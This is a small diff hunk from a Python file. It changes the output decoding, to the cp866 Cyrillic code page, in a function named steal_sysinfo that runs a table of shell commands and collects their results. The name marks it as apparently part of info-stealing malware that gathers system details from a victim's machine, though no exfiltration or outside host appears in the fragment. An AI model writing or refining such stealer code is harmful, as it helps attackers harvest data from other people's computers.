@@ -272,7 +272,7 @@ def steal_sysinfo():
     for k, cmd in SYSINFO.items():
         try:
             r = subprocess.run(cmd, shell=True, capture_output=True,
-                               text=True, timeout=10)
+                               encoding="cp866", errors="replace", timeout=10)
             out[k] = r.stdout.strip() if r.returncode == 0 else f"err: {r.stderr.strip()}"
         except subprocess.TimeoutExpired:
             out[k] = "timeout"
